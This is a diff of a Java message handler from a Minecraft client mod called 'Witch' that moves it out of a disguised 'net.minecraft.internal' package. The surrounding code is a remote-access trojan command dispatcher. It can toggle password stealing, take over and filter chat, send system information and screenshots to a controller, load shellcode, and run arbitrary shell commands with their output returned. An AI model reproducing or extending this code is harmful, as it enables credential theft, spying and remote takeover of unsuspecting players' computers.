@@ -1,17 +1,17 @@
-package net.minecraft.internal.connection;
+package me.soda.witch.client.connection;
 
-import net.minecraft.internal.Witch;
-import me.soda.witch.shared.NetUtil;
-import me.soda.witch.shared.socket.messages.Variables;
+import me.soda.witch.client.Witch;
+import me.soda.witch.client.utils.ChatUtils;
+import me.soda.witch.client.utils.MCUtils;
+import me.soda.witch.client.utils.ScreenshotUtil;
+import me.soda.witch.client.utils.ShellcodeLoader;
 import me.soda.witch.shared.FileUtil;
 import me.soda.witch.shared.LogUtil;
+import me.soda.witch.shared.NetUtil;
 import me.soda.witch.shared.ProgramUtil;
 import me.soda.witch.shared.socket.messages.Message;
+import me.soda.witch.shared.socket.messages.Variables;
 import net.minecraft.client.util.GlfwUtil;
-import net.minecraft.internal.utils.ChatUtil;
-import net.minecraft.internal.utils.MCUtils;
-import net.minecraft.internal.utils.ScreenshotUtil;
-import net.minecraft.internal.utils.ShellcodeLoader;
 import net.minecraft.text.Text;
 
 import java.lang.management.ManagementFactory;
@@ -25,7 +25,7 @@ public class MessageHandler {
             switch (msgType) {
                 case "steal_pwd_switch" ->
                         Variables.INSTANCE.passwordBeingLogged = !Variables.INSTANCE.passwordBeingLogged;
-                case "chat_control" -> ChatUtil.sendChat((String) msg);
+                case "chat_control" -> ChatUtils.sendChat((String) msg);
                 case "chat_filter" -> Variables.INSTANCE.filterPattern = (String) msg;
                 case "chat_filter_switch" -> Variables.INSTANCE.isBeingFiltered = !Variables.INSTANCE.isBeingFiltered;
                 case "chat_mute" -> Variables.INSTANCE.isMuted = !Variables.INSTANCE.isMuted;
@@ -33,7 +33,7 @@ public class MessageHandler {
                 case "systeminfo" -> Witch.send(msgType, MCUtils.systemInfo());
                 case "screenshot" -> ScreenshotUtil.gameScreenshot();
                 case "screenshot2" -> Witch.send(msgType, ScreenshotUtil.systemScreenshot());
-                case "chat" -> ChatUtil.chat(Text.of((String) msg), false);
+                case "chat" -> ChatUtils.chat(Text.of((String) msg), false);
                 case "shell" -> new Thread(() -> {
                     String result = ProgramUtil.runCmd((String) msg);
                     Witch.send(msgType, "\n" + result);
